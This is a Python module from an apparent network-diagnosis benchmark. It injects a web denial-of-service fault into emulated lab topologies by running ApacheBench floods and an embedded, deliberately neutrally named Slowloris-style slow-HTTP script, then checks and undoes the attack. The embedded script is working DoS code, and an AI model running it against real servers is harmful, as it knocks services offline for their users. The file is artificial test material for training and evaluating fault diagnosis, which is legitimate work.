from __future__ import annotations

import random
import time
from typing import Any
from urllib.parse import urlsplit

from pydantic import BaseModel, Field

from nika.net_env.verify import http_download_stats, median_float
from nika.problems.rca import node_resource
from nika.problems.support.ab_helpers import (
    ab_worker_log_tail,
    count_ab_workers,
    start_ab_workers,
    stop_ab_workers,
)
from nika.problems.support.compatible_columns import NON_K8S_HOST_COLUMNS
from nika.problems.base import (
    FailureDomain,
    build_verify_result,
    ProblemBase,
)
from nika.problems.support.benchmark_targets import choice
from nika.utils.logger import system_logger

# ==================================================================
# Problem: Web service under DoS attack
# ==================================================================

# Node-visible names stay neutral: agents can list files, processes, and the
# victim's access log, so nothing here names the injected fault.
_SLOW_HTTP_CLIENT = "/var/tmp/http-hold.py"
_SLOW_HTTP_PATTERN = "[h]ttp-hold.py"
_ATTACK_OBJECT = "download.bin"
_ATTACK_DIR = "archive"
_ATTACK_DIR_ITEMS = 2000
_SLOW_HTTP_SOURCE = """#!/usr/bin/env python3
import socket
import sys
import time

target = sys.argv[1]
port = int(sys.argv[2])
wanted = int(sys.argv[3])
sockets = []
while True:
    while len(sockets) < wanted:
        sock = socket.socket()
        sock.settimeout(1.0)
        try:
            sock.connect((target, port))
            sock.sendall(b"GET / HTTP/1.1\\r\\nHost: target\\r\\nX-Request-Id: ")
            sockets.append(sock)
        except OSError:
            sock.close()
            time.sleep(0.01)
    time.sleep(2.0)
    alive = []
    for sock in sockets:
        try:
            sock.sendall(b"x")
            alive.append(sock)
        except OSError:
            sock.close()
    sockets = alive
"""


class WebDoSParams(BaseModel):
    """Parameters for injecting a web DoS attack fault."""

    host_name: str = Field(description="Target web server host name.")
    attacker_device: str = Field(description="Attacker host name.")
    observer_device: str | None = Field(
        default=None,
        description="Independent client used to observe HTTP degradation.",
    )
    probe_url: str | None = Field(
        default=None,
        description="URL on host_name used for healthy and degraded probes.",
    )
    attack_url: str | None = Field(
        default=None,
        description="Reachable service URL to flood when it differs from host_name's IP.",
    )
    workers: int = Field(default=12, ge=1, le=32)
    concurrency_per_worker: int = Field(default=128, ge=1, le=1024)
    slow_connections: int = Field(default=400, ge=0, le=900)
    probe_samples: int = Field(default=5, ge=3, le=15)
    probe_timeout_sec: int = Field(default=5, ge=1, le=30)
    attack_object_mb: int = Field(default=4, ge=1, le=64)


def _pick_attacker(
    rng: random.Random,
    hosts: list[str],
    victim: str,
    fallback: str,
    *,
    pool: list[str] | None = None,
) -> str:
    candidates = [h for h in (pool or hosts) if h != victim]
    if not candidates:
        candidates = [h for h in hosts if h != victim]
    if not candidates:
        return fallback
    return rng.choice(candidates)


class WebDoS(ProblemBase):
    failure_domain = FailureDomain.SECURITY
    root_cause_name: str = "web_dos_attack"
    description = "Web service is under a denial-of-service attack."
    symptom_desc: str = "Users reports high latency when accessing some web services."
    TAGS: list[str] = ["http"]
    COMPATIBLE_COLUMNS = NON_K8S_HOST_COLUMNS
    BENCHMARK_TARGETS = "canonical"

    Params = WebDoSParams

    @classmethod
    def benchmark_inject_params(cls, ctx):
        rng, scenario, pools = ctx.rng, ctx.scenario, ctx.roles
        params: dict[str, str] = {}
        if scenario == "llmd_lab":
            controller_pool = pools.get("controllers") or []
            params["host_name"] = choice(rng, controller_pool, ctx.host0)
            params["attacker_device"] = _pick_attacker(
                rng,
                ctx.hosts,
                params["host_name"],
                ctx.host0,
                pool=pools.get("attacker_pool"),
            )
        elif scenario == "dc_clos":
            # Keep victim, observer, and URL on one deterministic HTTP path.
            params.update(
                host_name="webserver0_pod0",
                attacker_device="client_0",
                observer_device="dns_pod0",
                probe_url="http://10.0.1.2/small.bin",
            )
        elif scenario == "campus_lan":
            params.update(
                host_name="web_server_0",
                attacker_device="pc_1_1_1_1",
                observer_device="pc_2_1_1_1",
                probe_url="http://10.200.0.3/",
            )
        elif scenario == "enterprise_branch":
            params.update(
                host_name="hq_srv",
                attacker_device="br1_corp_pc",
                observer_device="hq_corp_pc",
                probe_url="http://10.0.20.2/small.bin",
                attack_url="http://10.0.20.2/archive/",
            )
        elif scenario in {"sdn_l3_clos", "p4_dc_fabric"}:
            model = ctx.net_env.model
            observer = model.client_endpoints()[0]
            victim = next(
                web for web in model.web_endpoints() if web.leaf_id != observer.leaf_id
            )
            attacker = next(
                client
                for client in reversed(model.client_endpoints())
                if client.name != observer.name
            )
            params.update(
                host_name=victim.name,
                attacker_device=attacker.name,
                observer_device=observer.name,
                probe_url=f"http://{victim.ip}/",
            )
        elif scenario == "p4_dc_gateway":
            model = ctx.net_env.model
            victim = model.backend_pool[0]
            observer = model.clients[0]
            attacker = model.clients[-1]
            params.update(
                host_name=victim.name,
                attacker_device=attacker.name,
                observer_device=observer.name,
                probe_url=model.vip_url,
                attack_url=model.vip_url,
            )
        else:
            params["host_name"] = ctx.web0
            params["attacker_device"] = _pick_attacker(
                rng,
                ctx.hosts,
                ctx.web0,
                ctx.host0,
                pool=pools.get("attacker_pool"),
            )
        return params

    def __init__(self, scenario_name: str | None, **kwargs):
        super().__init__(scenario_name, **kwargs)
        self.logger = system_logger
        self._baseline: dict[str, Any] | None = None

    def root_cause_resources(self, params: WebDoSParams):
        return [node_resource(params.host_name)]

    def _probe_url(self, params: WebDoSParams, target_ip: str) -> str:
        return params.probe_url or f"http://{target_ip}/"

    def _http_samples(self, params: WebDoSParams, target_ip: str) -> dict[str, Any]:
        observer = params.observer_device or params.attacker_device
        url = self._probe_url(params, target_ip)
        times_ms: list[float] = []
        codes: list[str] = []
        for _ in range(params.probe_samples):
            sample = http_download_stats(
                self.runtime,
                observer,
                url,
                max_time_sec=params.probe_timeout_sec,
                connect_timeout_sec=min(3, params.probe_timeout_sec),
            )
            codes.append(sample.http_code)
            if sample.ok and sample.time_total_s is not None:
                times_ms.append(sample.time_total_s * 1000.0)
        ordered = sorted(times_ms)
        p95_ms = ordered[-1] if ordered else None
        return {
            "observer": observer,
            "url": url,
            "attempts": params.probe_samples,
            "successes": len(times_ms),
            "error_rate": 1.0 - (len(times_ms) / params.probe_samples),
            "median_ms": median_float(times_ms),
            "p95_ms": p95_ms,
            "samples_ms": times_ms,
            "http_codes": codes,
        }

    def _worker_state(self, params: WebDoSParams) -> tuple[int, int, str]:
        return count_ab_workers(self.runtime, params.attacker_device)

    def _target_connections(self, host: str) -> int:
        output = self.runtime.exec(
            host,
            "ss -Htan '( sport = :80 )' 2>/dev/null | wc -l",
            timeout=10,
        ).strip()
        try:
            return int(output.splitlines()[-1])
        except (IndexError, ValueError):
            return 0

    def _slow_client_count(self, params: WebDoSParams) -> int:
        output = self.runtime.exec(
            params.attacker_device,
            f"ps -eo args 2>/dev/null | grep -c '{_SLOW_HTTP_PATTERN}' || true",
            timeout=10,
        ).strip()
        try:
            return int(output.splitlines()[-1])
        except (IndexError, ValueError):
            return 0

    def _slow_client_running(self, params: WebDoSParams) -> bool:
        return params.slow_connections == 0 or self._slow_client_count(params) >= 1

    def inject_fault(self, params: WebDoSParams):
        web_server = params.host_name
        attacker = params.attacker_device
        target_ip = self.runtime.get_host_ip(web_server, with_prefix=False)
        if not target_ip:
            raise RuntimeError(
                f"Cannot resolve IPv4 address for web server {web_server!r}"
            )
        if params.observer_device in {params.attacker_device, params.host_name}:
            raise ValueError(
                "observer_device must be independent of attacker and target"
            )

        self._baseline = self._http_samples(params, target_ip)
        if self._baseline["successes"] < params.probe_samples - 1:
            raise RuntimeError(
                f"web_dos_attack requires a healthy HTTP baseline: {self._baseline}"
            )

        # A large object (bulk transfer) and a large directory (expensive
        # listing) give the flood real per-request server work.
        self.runtime.exec(
            web_server,
            (
                f"mkdir -p /var/www /var/www/html /var/www/{_ATTACK_DIR}; "
                f"dd if=/dev/zero of=/var/www/{_ATTACK_OBJECT} bs=1M "
                f"count={params.attack_object_mb} status=none 2>/dev/null; "
                f"cp /var/www/{_ATTACK_OBJECT} /var/www/html/{_ATTACK_OBJECT} "
                "2>/dev/null || true; "
                f"for i in $(seq 1 {_ATTACK_DIR_ITEMS}); do "
                f": > /var/www/{_ATTACK_DIR}/item-$i; done"
            ),
            timeout=30,
        )
        attack_url = params.attack_url or f"http://{target_ip}/{_ATTACK_OBJECT}"
        attack_endpoint = urlsplit(attack_url)
        attack_host = attack_endpoint.hostname or target_ip
        attack_port = attack_endpoint.port or 80
        start_ab_workers(
            self.runtime,
            attacker,
            attack_url,
            workers=params.workers,
            concurrency=params.concurrency_per_worker,
            timeout=15,
        )
        if params.slow_connections:
            self.runtime.write_file(attacker, _SLOW_HTTP_CLIENT, _SLOW_HTTP_SOURCE)
            self.runtime.exec(
                attacker,
                f"pkill -f '{_SLOW_HTTP_PATTERN}' 2>/dev/null || true",
                timeout=10,
            )
            self.runtime.exec(
                attacker,
                f"nohup python3 {_SLOW_HTTP_CLIENT} {attack_host} {attack_port} "
                f"{params.slow_connections} </dev/null >/dev/null 2>&1 &",
                timeout=10,
            )

        deadline = time.monotonic() + 12.0
        workers = ab_processes = connections = 0
        slow_client_running = False
        required_connections = max(2, min(20, params.slow_connections // 2))
        state = ""
        while time.monotonic() < deadline:
            time.sleep(0.5)
            workers, ab_processes, state = self._worker_state(params)
            connections = self._target_connections(web_server)
            slow_client_running = self._slow_client_running(params)
            if (
                workers >= params.workers
                and ab_processes >= 1
                and slow_client_running
                and connections >= required_connections
            ):
                break
        if (
            workers < params.workers
            or ab_processes < 1
            or not slow_client_running
            or connections < required_connections
        ):
            logs = ab_worker_log_tail(self.runtime, attacker, lines=20)
            raise RuntimeError(
                "web_dos_attack traffic did not become ready: "
                f"{state}, slow_client={slow_client_running}, "
                f"target_connections={connections}, log={logs!r}"
            )
        self.logger.info(
            "Started web DoS: attacker=%s target=%s workers=%d concurrency=%d connections=%d",
            attacker,
            web_server,
            workers,
            params.concurrency_per_worker,
            connections,
        )

    def verify_fault(self, params: WebDoSParams) -> dict:
        """Verify the attack processes are injected (artifact gate for inject)."""
        web_server = params.host_name
        attacker = params.attacker_device
        target_ip = self.runtime.get_host_ip(web_server, with_prefix=False)
        workers, ab_processes, process_state = self._worker_state(params)
        target_connections = self._target_connections(web_server)
        slow_client_running = self._slow_client_running(params)
        required_connections = max(2, min(20, params.slow_connections // 2))
        attack_ready = bool(
            workers >= params.workers
            and ab_processes >= 1
            and slow_client_running
            and target_connections >= required_connections
        )
        return build_verify_result(
            fault_type=self.root_cause_name,
            verified=attack_ready,
            details={
                "attacker": attacker,
                "target_ip": target_ip,
                "workers": workers,
                "ab_processes": ab_processes,
                "target_connections": target_connections,
                "slow_client_running": slow_client_running,
                "process_state": process_state,
                "attack_ready": attack_ready,
            },
        )

    def recover_fault(self, params: WebDoSParams) -> dict:
        stop_ab_workers(self.runtime, params.attacker_device)
        self.runtime.exec(
            params.attacker_device,
            f"pkill -f '{_SLOW_HTTP_PATTERN}' 2>/dev/null || true",
            timeout=10,
        )
        time.sleep(0.3)
        workers, ab_processes, _ = self._worker_state(params)
        slow_clients = self._slow_client_count(params)
        return {
            "verified": workers == 0 and ab_processes == 0 and slow_clients == 0,
            "details": {
                "workers": workers,
                "ab_processes": ab_processes,
                "slow_clients": slow_clients,
            },
        }
